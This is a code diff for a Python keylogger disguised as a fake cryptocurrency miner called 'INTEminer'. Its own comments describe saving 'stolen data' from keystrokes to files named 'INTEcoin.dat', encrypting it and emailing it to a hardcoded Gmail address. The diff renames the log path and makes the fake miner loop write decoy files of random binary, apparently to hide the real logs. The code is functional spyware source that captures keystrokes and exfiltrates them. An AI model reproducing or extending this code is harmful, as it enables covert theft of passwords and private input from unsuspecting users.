@@ -12,7 +12,7 @@ keystrokes_count = 0
 saves_count = 0
 KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
 SAVES_BUFFER_SIZE = 2  # How many saves before sending
-FILE_PATH = "Data/"  # File path to save stolen data
+LOGS_PATH = "Logs/"  # File path to save stolen data
 TARGET_EMAIL = "intelogger@gmail.com" # Sender and receiver of the data
 
 
@@ -75,7 +75,7 @@ def writer(log):
     Saves the log in a dat file.
     :param log: An array of pressed keys.
     """
-    with open(FILE_PATH + "INTEcoin.dat", "ab") as file:
+    with open(LOGS_PATH + "INTEcoin.dat", "ab") as file:
         toWrite = ""
         for i, key in enumerate(log): # Removes repeated spaces and enters
             if i > 0:
@@ -116,14 +116,14 @@ def results():
     message = ""
     accumulatedLog = []
 
-    for byt in Encryption.bytes_from_file(FILE_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
+    for byt in Encryption.bytes_from_file(LOGS_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
         if byt == "@":
             accumulatedLog.append(message)
             message = ""
             continue
         message += byt
 
-    filename= FILE_PATH + "INTEcoin" + str(random.randint(1,10000)) + ".dat" # Save encrypted data as "INTEcoins"
+    filename= LOGS_PATH + "INTEcoin" + str(random.randint(1,10000)) + ".dat" # Save encrypted data as "INTEcoins"
 
     message = ""  # Reusing the parameter
     with open(filename, "wb") as file: # Saving the data in the new
@@ -136,7 +136,7 @@ def results():
             break
     if toSend:
         send(accumulatedLog)  # Send the encrypted data
-    os.remove(FILE_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again
+    os.remove(LOGS_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again
 
 
 def send(data):
@@ -160,14 +160,22 @@ def miner(): # Fake miner
     print("Welcome to INTEminer for INTEcoins!")
     print("Mining", end = "")
     INTEcoins=0
+    file_count = 1
     while True:
         print(".", end = "")
         randomNumber=random.randint(1, 100)
         time.sleep(randomNumber/20) # Sleep for a short random time
-        if random.randint(1, 10) == 5:
+        if randomNumber%10 == 0:
             INTEcoins += randomNumber
             print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
             print("Mining", end = "")
+        if randomNumber%50 == 0:
+            file_count+=1
+        else:
+            with open(LOGS_PATH + "INTEcoin{}.dat".format(file_count), "a") as file:
+                file.write("{0:b}".format(random.randint(10000000000,100000000000)))
+                file.close()
+
 
 """
 if __name__ == '__main__':
